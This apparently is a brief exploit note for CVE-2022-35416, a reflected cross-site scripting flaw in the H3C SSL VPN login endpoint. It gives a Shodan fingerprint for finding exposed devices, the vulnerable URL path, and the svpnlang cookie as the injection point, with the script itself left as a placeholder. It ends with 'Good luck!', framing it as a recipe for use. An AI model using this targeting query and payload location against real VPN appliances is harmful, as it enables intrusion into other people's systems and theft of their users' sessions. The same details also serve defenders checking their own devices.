# CVE-2022-35416
H3C_SSL_VPN_XSS(Reflected XSS) CVE-2022-35416
# from  https://www.cloudwaf.cc/cve/cve-2022-35416 

Payload:
Shodan: http.html_hash:510586239
Access address：https://IP:PORT/wnm/login/login.json.
Payload: Cookie: svpnlang=__XSS_PAYLOAD__


Description
H3C SSL VPN through 2022-07-10 allows wnm/login/login.json svpnlang cookie XSS.

Good luck!
